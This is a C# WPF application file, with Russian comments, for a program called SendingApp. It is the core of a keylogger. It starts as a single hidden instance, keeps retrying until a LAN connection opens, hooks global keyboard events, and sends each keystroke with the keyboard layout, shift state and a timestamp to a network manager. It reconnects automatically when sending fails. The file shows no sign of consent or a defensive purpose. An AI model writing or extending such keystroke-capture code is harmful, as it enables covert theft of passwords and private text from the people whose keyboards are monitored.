using System;
using System.Diagnostics;
using System.Threading;
using System.Windows;
using System.Windows.Input;

namespace SendingApp {
    internal partial class App : Application {

        Mutex mutex;
        LANManager lanManager;

        protected override void OnStartup(StartupEventArgs e) {
            base.OnStartup(e);
            
            // Предотвращаем множественный запуск процесса
            string name = "4b16bf6e-dae5-442b-b59f-e34d4901f982";
            try {
                mutex = Mutex.OpenExisting(name);
                mutex.Close();
                Process.GetCurrentProcess().Kill();
            } catch {
                mutex = new Mutex(true, name);
            }

            connect();
        }

        void connect() {
            lanManager = new LANManager();

            while (true) {
                try {
                    lanManager.Connect();
                    break;
                } catch { continue; }
            }

            // Подписываемся на события нажатия клавиш
            KeyboardTracker.KeyDown += KeyboardTracker_KeyDown;

            // Запускаем отслеживание
            KeyboardTracker.StartTracking();
        }

        #region KeyboardTracker

        void KeyboardTracker_KeyDown(Keys key) {
            try {
                lanManager.Send(
                    key,
                    KeyboardTracker.GetCurrentKeyboardLayout(),
                    Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift),
                    DateTime.Now);
            } catch {
                // Если не получилось отправить сообщение
                // прекращаем отслеживать нажатия клавиш
                // и пробуем подключится снова

                KeyboardTracker.KeyDown -= KeyboardTracker_KeyDown;
                KeyboardTracker.StopTracking();

                lanManager.Disconnect();

                connect();
            }
        }

        #endregion
    }
}